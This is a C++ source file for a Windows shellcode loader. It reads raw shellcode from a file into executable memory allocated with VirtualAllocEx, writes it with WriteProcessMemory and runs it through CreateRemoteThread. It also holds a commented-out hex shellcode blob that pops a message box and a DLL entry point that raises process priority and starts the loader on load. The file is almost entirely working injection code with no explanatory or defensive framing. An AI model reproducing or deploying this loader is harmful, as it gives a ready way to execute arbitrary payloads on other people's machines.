#include <windows.h>
#include <iostream>
#include <fstream>
#include <future>

using namespace std;

int main()
{

    int process_id = GetCurrentProcessId();

    //MessageBox
    //char xcode[] = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\xc\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x1\xda\x8b\x52\x78\x1\xda\x8b\x72\x20\x1\xde\x31\xc9\x41\xad\x1\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x4\x72\x6f\x63\x41\x75\xeb\x81\x78\x8\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x1\xde\x66\x8b\xc\x4e\x49\x8b\x72\x1c\x1\xde\x8b\x14\x8e\x1\xda\x31\xc9\x53\x52\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\xc\x59\x50\x51\x66\xb9\x6c\x6c\x51\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x54\xff\xd0\x83\xc4\x10\x8b\x54\x24\x4\xb9\x6f\x78\x41\x0\x51\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd2\x83\xc4\x10\x68\x61\x62\x63\x64\x83\x6c\x24\x3\x64\x89\xe6\x31\xc9\x51\x56\x56\x51\xff\xd0";

    vector<char> xcode;

    ifstream infile;
    infile.open("shellcode.bin", std::ios::in | std::ios::binary);
    infile.seekg(0, std::ios::end);
    size_t file_size_in_byte = infile.tellg();
    xcode.resize(file_size_in_byte);
    infile.seekg(0, std::ios::beg);
    infile.read(&xcode[0], file_size_in_byte);
    infile.close();

    HANDLE process_handle;
    DWORD pointer_after_allocated;
    process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
    if (process_handle == NULL)
    {
        puts("[-]Error while open the process\n");
    }
    else {
        puts("[+] Process Opened sucessfully\n");
    }

      pointer_after_allocated = (DWORD)VirtualAllocEx(process_handle, NULL, file_size_in_byte, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pointer_after_allocated == NULL) {
        puts("[-]Error while get the base address to write\n");
    }
    else {
        printf("[+]Got the address to write 0x%x\n", pointer_after_allocated);
    }
    if (WriteProcessMemory(process_handle, (LPVOID)pointer_after_allocated, &xcode[0] /*(LPCVOID) shellcode*/, sizeof(xcode), 0)) {
        puts("[+]Injected\n");
        puts("[+]Running the shellcode as new thread !\n");
        CreateRemoteThread(process_handle, NULL, 100, (LPTHREAD_START_ROUTINE)pointer_after_allocated, NULL, NULL, NULL);
    }
    else {
        puts("Not Injected\n");
    }
    return 0;
}

BOOL APIENTRY dll_main(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		void* process = GetCurrentProcess();

		DWORD_PTR affinity_mask;
		DWORD_PTR sys_aff_mask;
		DWORD_PTR mask = 0x1;
		constexpr auto core{ 1 };
		auto bit{ 0 }, curr_core{ 1 };
		if (!GetProcessAffinityMask(process, &affinity_mask, &sys_aff_mask))
			goto out;
		do
		{
			if (mask & affinity_mask)
			{
				if (curr_core == core and !(sys_aff_mask & mask))
				{
					goto out;
				}
				affinity_mask &= ~mask;
				curr_core++;
			}
			mask = mask << 1;
		} while (bit++ < 64);

		SetProcessAffinityMask(process, affinity_mask & sys_aff_mask);

	out:

		SetPriorityClass(process, REALTIME_PRIORITY_CLASS);
		std::thread(main).detach();
	}
	return TRUE;
}